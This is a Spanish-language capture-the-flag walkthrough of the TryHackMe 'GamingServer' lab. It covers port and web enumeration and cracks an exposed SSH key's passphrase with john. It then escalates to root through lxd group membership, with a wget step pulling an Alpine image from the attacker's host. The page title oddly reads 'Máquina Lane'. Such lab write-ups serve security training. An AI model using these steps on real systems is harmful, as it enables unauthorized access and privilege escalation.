---
layout: post
author: Osbaldo Cortes L.
title: Máquina Lane
---

# Gaming Server

[TryHackMe | GamingServer](https://tryhackme.com/room/gamingserver)

---

## 1. Fase de reconocimiento.

- Para  conocer a que nos estamos enfrentando lanzamos el siguiente comando:

```bash
ping -c 1 {ip}
```

```bash
ping -c 1 10.10.53.144                          
PING 10.10.53.144 (10.10.53.144) 56(84) bytes of data.
64 bytes from 10.10.53.144: icmp_seq=1 ttl=63 time=158 ms

--- 10.10.53.144 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 158.388/158.388/158.388/0.000 ms
```

- De acuerdo con el ttl=63 sabemos que nos estamos enfrentando a una máquina con sistema operativo Linux.
- Whatweb nos da la siguiente información:

```bash
whatweb 10.10.53.144                                                           
http://10.10.53.144 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.53.144], Title[House of danak]

```

![Untitled](Gaming%20Ser%2071c53/Untitled.png)

- Página web: observamos la siguiente página:

![Untitled](Gaming%20Ser%2071c53/Untitled%201.png)

- Observamos el código y  encontramos el siguiente nombre “***john***”:

```bash
!DOCTYPE html>
<!-- Website template by freewebsitetemplates.com -->
<head>
	<title>House of danak</title>
	<meta  charset="utf-8">
	<link href="style.css" rel="stylesheet" type="text/css">
</head>
<body>
	<div id="page">
		<div id="header">
			<a id="logo" href="index.html"><img src="logo.png" alt=""></a>
			<ul class="navigation">
				<li class="first">
					<a class="active" href="index.html">House of danak</a>
				</li>
				<li>
					<a href="about.html">draagan lore</a>
				</li>
				<li>
					<a href="myths.html">myths of d'roga</a>
				</li>
				<li>
					<a href="#">ARCHIVES</a>
				</li>
			</ul>
		</div>
		<div id="body">
			<div class="featured"> <img src="featured-character.jpg" alt="">
				<div class="section">
					<h2><a href="index.html">House of Danak</a></h2>
					<p>
						Lorem ipsum dolor sit amet, consectetuer adipiscing elit, sed diam nonummy nibh euismod tincidunt utUt wisi enim ad minim veniam. Ut wisi enim ad minim veniam, quis nostrud
					</p>
					<a class="readmore" href="index.html">&nbsp;</a> </div>
				<span>&nbsp;</span> </div>
			<div id="content">
				<p>
					Lorem ipsum dolor sit amet, consectetuer adipiscing elit, sed diam nonummy nibh euismod tincidunt utUt wisi enim ad minim veniam. Ut wisi enim ad minim veniam, quis nostrud exerci tation ullamcorper suscipit lobortis nisl ut aliquip ex ea commodo consequat. Duis autem vel eum iriure dolor in hendrerit in vulputate velit esse molestie consequat, vel illum dolore eu feugiat nulla facilisis at vero eros et accumsan et iusto odio dignissim qui blandit praesent luptatum zzril delenit augue duis dolore te feugait nulla facilisi. Nam liber tempor cum soluta nobis eleifend option congue nihil imperdiet doming id quod mazim placerat facer possim assum.
				</p>
				<p>
					Typi non habent claritatem insitam; est usus legentis in iis qui facit eorum claritatem. I me lius quod ii legunt saepius. Claritas est etiam processus dynamicus, qui sequitur mutationem consuetudium
				</p>
			</div>
			<div id="sidebar"> <a class="readmore" href="archives.html">&nbsp;</a>
				<ul class="connect">
					<li>
						Follow Us Here:
					</li>
					<li>
						<a class="twitter" href="#">&nbsp;</a>
					</li>
					<li>
						<a class="facebook" href="#">&nbsp;</a>
					</li>
					<li>
						<a class="googleplus" href="#">&nbsp;</a>
					</li>
				</ul>
			</div>
		</div>
		<div id="footer">
			<ul>
				<li>
					<a href="about.html" class="video">&nbsp;</a>
				</li>
				<li>
					<a href="myths.html" class="myths">&nbsp;</a>
				</li>
				<li class="last">
					<a href="#" class="archives">&nbsp;</a>
				</li>
			</ul>
		</div>
	</div>
</body>
<!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. -->
</html>
```

---

## 2. Enumeración / Escaneo

- Escaneo a la totalidad de los 65536 puertos de red:

```bash
nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn 10.10.53.144
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-11 22:24 -05
Initiating SYN Stealth Scan at 22:24
Scanning 10.10.53.144 [65535 ports]
Discovered open port 80/tcp on 10.10.53.144
Discovered open port 22/tcp on 10.10.53.144
Completed SYN Stealth Scan at 22:24, 13.66s elapsed (65535 total ports)
Nmap scan report for 10.10.53.144
Host is up, received user-set (0.16s latency).
Scanned at 2022-04-11 22:24:25 -05 for 14s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 13.78 seconds
           Raw packets sent: 67488 (2.969MB) | Rcvd: 67196 (2.688MB)

```

---

- Escaneo de vulnerabilidades con NMAP

Se encuentran los puertos 22(ssh) y 80 (http) abiertos.

- Escaneo en busca de vulnerabilidades sobre los puertos abiertos:

```bash
nmap -sCV -A -T4 -p22,80 10.10.53.144
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-11 22:25 -05
Nmap scan report for 10.10.53.144 (10.10.53.144)
Host is up (0.15s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 34:0e:fe:06:12:67:3e:a4:eb:ab:7a:c4:81:6d:fe:a9 (RSA)
|   256 49:61:1e:f4:52:6e:7b:29:98:db:30:2d:16:ed:f4:8b (ECDSA)
|_  256 b8:60:c4:5b:b7:b2:d0:23:a0:c7:56:59:5c:63:1e:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: House of danak
|_http-server-header: Apache/2.4.29 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (92%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.11 (92%), Linux 3.2 - 4.9 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   157.84 ms 10.9.0.1 (10.9.0.1)
2   158.15 ms 10.10.53.144 (10.10.53.144)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.39 seconds
```

---

- Escaneo con “wfuzz” sobre la ip de la máquina víctima:

```bash
wfuzz --hc=404 -w /usr/share/dirb/wordlists/common.txt http://10.10.53.144/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.53.144/FUZZ
Total requests: 4614

=====================================================================
ID           Response   Lines    Word       Chars       Payload                         
=====================================================================

000000001:   200        77 L     316 W      2762 Ch     "http://10.10.53.144/"          
000000011:   403        9 L      28 W       277 Ch      ".hta"                          
000000013:   403        9 L      28 W       277 Ch      ".htpasswd"                     
000000012:   403        9 L      28 W       277 Ch      ".htaccess"                     
000002020:   200        77 L     316 W      2762 Ch     "index.html"                    
000003436:   200        3 L      5 W        33 Ch       "robots.txt"                    
000003537:   301        9 L      28 W       313 Ch      "secret"                        
000003588:   403        9 L      28 W       277 Ch      "server-status"                 
000004216:   301        9 L      28 W       314 Ch      "uploads"                       

Total time: 0
Processed Requests: 4614
Filtered Requests: 4605
Requests/sec.: 0
```

- Revisando en los dominios encontrados las siguientes páginas:

Robots.txt: no se encontró una ruta interesante:

![Untitled](Gaming%20Ser%2071c53/Untitled%202.png)

Secret: encontramos una llave ssh.

![Untitled](Gaming%20Ser%2071c53/Untitled%203.png)

Uploads: encontramos los siguientes archivos, 

![Untitled](Gaming%20Ser%2071c53/Untitled%204.png)

---

- De los archivos “manifesto.txt” y “meme.jpg” no se encontró nada interesante, el archivo “dict.lst” lo podemos utilizar más adelante.

---

## 3. Explotación

## John

- Ingresamos mediante el siguiente comando via SSH:
- Guardamos el archivo “***secretKey***” con el nombre que usted quiera, en mi caso lo nombre “key”

![Untitled](Gaming%20Ser%2071c53/Untitled%205.png)

- Creamos una copia de “key” como “hash” para poder aplicar fuerza bruta:

```bash
ssh2john key > hash
```

- Con john, y el diccionario encontrado “dict.lst” y encontramos la contraseña para conectarnos vía ssh:

```bash
john --wordlist=/home/ocortesl/Descargas/dict.lst hash
```

- Otorgamos permiso a “key”

```bash
chmod 600 key
```

- Conexión vía ssh:

```bash
ssh -i key john@{ip}
```

```bash
ssh -i key john@10.10.53.144
Enter passphrase for key 'key': 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-76-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Apr 12 03:51:52 UTC 2022

  System load:  0.0               Processes:             99
  Usage of /:   41.1% of 9.78GB   Users logged in:       0
  Memory usage: 37%               IP address for eth0:   10.10.53.144
  Swap usage:   0%                IP address for lxdbr0: 10.229.116.1

0 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Tue Apr 12 01:48:37 2022 from 10.9.0.50
```

- Bandera de usuario:

![Untitled](Gaming%20Ser%2071c53/Untitled%206.png)

---

## 4. Escalada de privilegios

- Compartimos “linpeas.sh” y lo ejecutamos, después de revisar las posibles vías para escalar privilegios, la única que funcionó fue “lxd”:

![Untitled](Gaming%20Ser%2071c53/Untitled%207.png)

- En la máquina atacante clonamos el siguiente repositorio:

```bash
git clone https://github.com/saghul/lxd-alpine-builder.git
```

![Untitled](Gaming%20Ser%2071c53/Untitled%208.png)

- Con el siguiente comando creamos el ejecutable del exploit:

```bash
cd lxd-alpine-builder
```

```bash
./build-alpine 
Determining the latest release... v3.15
Using static apk from http://dl-cdn.alpinelinux.org/alpine//v3.15/main/x86_64
Downloading alpine-keys-2.4-r1.apk
tar: Se desestima la palabra clave de la cabecera extendida desconocida 'APK-TOOLS.checksum.SHA1'
tar: Se desestima la palabra clave de la cabecera extendida desconocida 'APK-TOOLS.checksum.SHA1'
tar: Se desestima la palabra clave de la cabecera extendida desconocida 'APK-TOOLS.checksum.SHA1'
tar: Se desestima la palabra clave de la cabecera extendida desconocida 'APK-TOOLS.checksum.SHA1'
tar: Se desestima la palabra clave de la cabecera extendida desconocida 'APK-TOOLS.checksum.SHA1'
tar: Se desestima la palabra clave de la cabecera extendida desconocida 'APK-TOOLS.checksum.SHA1'
tar: Se desestima la palabra clave de la cabecera extendida desconocida 'APK-TOOLS.checksum.SHA1'
tar: Se desestima la palabra clave de la cabecera extendida desconocida 'APK-TOOLS.checksum.SHA1'
tar: Se desestima la palabra clave de la cabecera extendida desconocida 'APK-TOOLS.checksum.SHA1'
tar: Se desestima la palabra clave de la cabecera extendida desconocida 'APK-TOOLS.checksum.SHA1'
tar: Se desestima la palabra clave de la cabecera extendida desconocida 'APK-TOOLS.checksum.SHA1'
tar: Se desestima la palabra clave de la cabecera extendida desconocida 'APK-TOOLS.checksum.SHA1'
tar: Se desestima la palabra clave de la cabecera extendida desconocida 'APK-TOOLS.checksum.SHA1'
tar: Se desestima la palabra clave de la cabecera extendida desconocida 'APK-TOOLS.checksum.SHA1'
tar: Se desestima la palabra clave de la cabecera extendida desconocida 'APK-TOOLS.checksum.SHA1'
tar: Se desestima la palabra clave de la cabecera extendida desconocida 'APK-TOOLS.checksum.SHA1'
tar: Se desestima la palabra clave de la cabecera extendida desconocida 'APK-TOOLS.checksum.SHA1'
tar: Se desestima la palabra clave de la cabecera extendida desconocida 'APK-TOOLS.checksum.SHA1'
tar: Se desestima la palabra clave de la cabecera extendida desconocida 'APK-TOOLS.checksum.SHA1'
tar: Se desestima la palabra clave de la cabecera extendida desconocida 'APK-TOOLS.checksum.SHA1'
tar: Se desestima la palabra clave de la cabecera extendida desconocida 'APK-TOOLS.checksum.SHA1'
tar: Se desestima la palabra clave de la cabecera extendida desconocida 'APK-TOOLS.checksum.SHA1'
tar: Se desestima la palabra clave de la cabecera extendida desconocida 'APK-TOOLS.checksum.SHA1'
tar: Se desestima la palabra clave de la cabecera extendida desconocida 'APK-TOOLS.checksum.SHA1'
tar: Se desestima la palabra clave de la cabecera extendida desconocida 'APK-TOOLS.checksum.SHA1'
tar: Se desestima la palabra clave de la cabecera extendida desconocida 'APK-TOOLS.checksum.SHA1'
tar: Se desestima la palabra clave de la cabecera extendida desconocida 'APK-TOOLS.checksum.SHA1'
tar: Se desestima la palabra clave de la cabecera extendida desconocida 'APK-TOOLS.checksum.SHA1'
tar: Se desestima la palabra clave de la cabecera extendida desconocida 'APK-TOOLS.checksum.SHA1'
tar: Se desestima la palabra clave de la cabecera extendida desconocida 'APK-TOOLS.checksum.SHA1'
tar: Se desestima la palabra clave de la cabecera extendida desconocida 'APK-TOOLS.checksum.SHA1'
tar: Se desestima la palabra clave de la cabecera extendida desconocida 'APK-TOOLS.checksum.SHA1'
tar: Se desestima la palabra clave de la cabecera extendida desconocida 'APK-TOOLS.checksum.SHA1'
tar: Se desestima la palabra clave de la cabecera extendida desconocida 'APK-TOOLS.checksum.SHA1'
tar: Se desestima la palabra clave de la cabecera extendida desconocida 'APK-TOOLS.checksum.SHA1'
tar: Se desestima la palabra clave de la cabecera extendida desconocida 'APK-TOOLS.checksum.SHA1'
tar: Se desestima la palabra clave de la cabecera extendida desconocida 'APK-TOOLS.checksum.SHA1'
tar: Se desestima la palabra clave de la cabecera extendida desconocida 'APK-TOOLS.checksum.SHA1'
tar: Se desestima la palabra clave de la cabecera extendida desconocida 'APK-TOOLS.checksum.SHA1'
tar: Se desestima la palabra clave de la cabecera extendida desconocida 'APK-TOOLS.checksum.SHA1'
tar: Se desestima la palabra clave de la cabecera extendida desconocida 'APK-TOOLS.checksum.SHA1'
Downloading apk-tools-static-2.12.7-r3.apk
tar: Se desestima la palabra clave de la cabecera extendida desconocida 'APK-TOOLS.checksum.SHA1'
tar: Se desestima la palabra clave de la cabecera extendida desconocida 'APK-TOOLS.checksum.SHA1'
alpine-devel@lists.alpinelinux.org-6165ee59.rsa.pub: La suma coincide
Verified OK
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2575  100  2575    0     0   1073      0  0:00:02  0:00:02 --:--:--  1073
--2022-04-11 21:51:10--  http://alpine.mirror.wearetriple.com/MIRRORS.txt
Resolviendo alpine.mirror.wearetriple.com (alpine.mirror.wearetriple.com)... 93.187.10.106, 2a00:1f00:dc06:10::106
Conectando con alpine.mirror.wearetriple.com (alpine.mirror.wearetriple.com)[93.187.10.106]:80... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 2575 (2,5K) [text/plain]
Grabando a: «/root/lxd-alpine-builder/rootfs/usr/share/alpine-mirrors/MIRRORS.txt»

/root/lxd-alpine-builder 100%[===============================>]   2,51K  --.-KB/s    en 0s      

2022-04-11 21:51:11 (462 MB/s) - «/root/lxd-alpine-builder/rootfs/usr/share/alpine-mirrors/MIRRORS.txt» guardado [2575/2575]

Selecting mirror http://mirror.kku.ac.th/alpine/v3.15/main
fetch http://mirror.kku.ac.th/alpine/v3.15/main/x86_64/APKINDEX.tar.gz
(1/20) Installing musl (1.2.2-r7)
(2/20) Installing busybox (1.34.1-r5)
Executing busybox-1.34.1-r5.post-install
(3/20) Installing alpine-baselayout (3.2.0-r18)
Executing alpine-baselayout-3.2.0-r18.pre-install
Executing alpine-baselayout-3.2.0-r18.post-install
(4/20) Installing ifupdown-ng (0.11.3-r0)
(5/20) Installing openrc (0.44.7-r5)
Executing openrc-0.44.7-r5.post-install
(6/20) Installing alpine-conf (3.13.1-r0)
(7/20) Installing ca-certificates-bundle (20211220-r0)
(8/20) Installing libcrypto1.1 (1.1.1n-r0)
(9/20) Installing libssl1.1 (1.1.1n-r0)
(10/20) Installing libretls (3.3.4-r3)
(11/20) Installing ssl_client (1.34.1-r5)
(12/20) Installing zlib (1.2.12-r0)
(13/20) Installing apk-tools (2.12.7-r3)
(14/20) Installing busybox-suid (1.34.1-r5)
(15/20) Installing busybox-initscripts (4.0-r5)
Executing busybox-initscripts-4.0-r5.post-install
(16/20) Installing scanelf (1.3.3-r0)
(17/20) Installing musl-utils (1.2.2-r7)
(18/20) Installing libc-utils (0.7.2-r3)
(19/20) Installing alpine-keys (2.4-r1)
(20/20) Installing alpine-base (3.15.4-r0)
Executing busybox-1.34.1-r5.trigger
OK: 9 MiB in 20 packages
```

```bash
ll alpine-v3.13-x86_64-20210218_0139.tar.gz 
-rw-r--r-- 1 root root 3259593 abr 11 21:47 alpine-v3.13-x86_64-20210218_0139.tar.gz
```

- Compartimos el archivo anterior mediante un servidor en python:

```bash
python -m http.server 80
```

---

- Desde la máquina víctima descargamos el archivo con el siguiente comando:

```bash
wget -c http://10.9.0.50/alpine-v3.13-x86_64-20210218_0139.tar.gz
```

![Untitled](Gaming%20Ser%2071c53/Untitled%209.png)

- El la maquina victima creamos un script, nosotros lo nombramos “lxd.sh” con el siguiente código:

[Offensive Security's Exploit Database Archive](https://www.exploit-db.com/exploits/46978)

![Untitled](Gaming%20Ser%2071c53/Untitled%2010.png)

- Otorgamos permisos de ejecución sobre el script “lxd.sh” creado en el punto anterior:

```bash
chmod u+x lxd.sh
```

- Ejecutamos el exploit con el siguiente comando:

```bash
./lxd.sh -f alpine-v3.13-x86_64-20210218_0139.tar.gz
```

```bash
ohn@exploitable:/tmp$ chmod u+x lxd.sh
john@exploitable:/tmp$ ./lxd.sh -f alpine-v3.13-x86_64-20210218_0139.tar.gz
Image imported with fingerprint: cd73881adaac667ca3529972c7b380af240a9e3b09730f8c8e4e6a23e1a7892b
[*] Listing images...

+--------+--------------+--------+-------------------------------+--------+--------+------------------------------+
| ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |
+--------+--------------+--------+-------------------------------+--------+--------+------------------------------+
| alpine | cd73881adaac | no     | alpine v3.13 (20210218_01:39) | x86_64 | 3.11MB | Apr 12, 2022 at 4:14am (UTC) |
+--------+--------------+--------+-------------------------------+--------+--------+------------------------------+
Creating privesc
Device giveMeRoot added to privesc
~ # whoami
root
```

- Para tener acceso a la bandera root, debemos acceder desde la montura:

```bash
cd /mnt/root/root/
```

![Untitled](Gaming%20Ser%2071c53/Untitled%2011.png)

---

Eso es todo!

Créditos: 

[](https://ctf.terkiba.com/game-server/)

[Lxd Privilege Escalation - Hacking Articles](https://www.hackingarticles.in/lxd-privilege-escalation/)